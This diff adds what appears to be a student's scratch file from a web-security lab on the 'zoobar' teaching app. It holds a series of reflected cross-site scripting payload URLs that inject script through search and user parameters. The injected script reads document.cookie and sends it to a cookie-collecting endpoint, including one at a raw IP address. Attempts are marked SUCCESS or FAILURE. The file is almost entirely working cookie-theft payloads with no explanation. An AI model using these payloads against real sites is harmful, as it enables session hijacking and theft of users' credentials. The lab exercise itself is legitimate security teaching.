@@ -1,0 +1,39 @@
+</script>hhjdjhgd
+
+
+
+
+
+
+
+
+http://zoobar.org/search?q=</script>jdjdjdjd<script>alert('yo')</script>
+
+http://zoobar.org/search?q=</script><script>alert('yo')</script><script>
+
+http://zoobar.org/search?q=</script><script>alert(document.cookie)</script><script>
+
+http://zoobar.org/search?q=</script><script>window.open('http://zoobar.org/cookie?cookie='%2Bdocument.cookie)</script><script> -- FAILURE
+
+http://zoobar.org/search?q=</script><script>window.open('http://zoobar.org/cookie?cookie='%2Bescape(document.cookie))</script><script> -- SUCCESS
+
+http://zoobar.org/search?q=</script><script>xmlhttp.open('GET', 'http://zoobar.org/cookie?cookie='%2Bescape(document.cookie), false)</script><script> -- FAILURE
+
+http://zoobar.org/search?q=</script><script>xmlhttp.open('GET', 'http://zoobar.org/cookie?cookie='%2Bescape(document.cookie), false); xmlhttp.send()</script><script> -- SUCCESS
+
+xmlhttp.open("GET","ajax_info.txt",true);
+
+
+
+http://166.78.248.220/users.php?user=%3C/script%3E%3Cscript%3Ewindow.open%28%27http://166.78.248.220/cookies.php?cookie=%27%2Bescape%28document.cookie%29%29%3C/script%3E%3Cscript%3E
+
+
+166.78.248.220/users.php?user=</script><script>window.open('http://166.78.248.220/cookies.php?cookie='%2Bescape(document.cookie))</script><script> SUCCESS
+=
+zoobar.stanford.edu/users.php?user=</script><script>window.open('http://zoobar.stanford.edu/cookies.php?cookie='%2Bescape(document.cookie))</script><script> SUCCESS
+
+= 
+
+http://166.78.248.220/users.php?user=</script><script>xmlhttp.open('GET', '166.78.248.220/cookies.php?cookie='%2Bescape(document.cookie), false); xmlhttp.send()</script><script>
+=
+http://zoobar.stanford.edu/users.php?user=</script><script>xmlhttp.open('GET', 'http://zoobar.stanford.edu/cookies.php?cookie='%2Bescape(document.cookie), false); xmlhttp.send()</script><script>
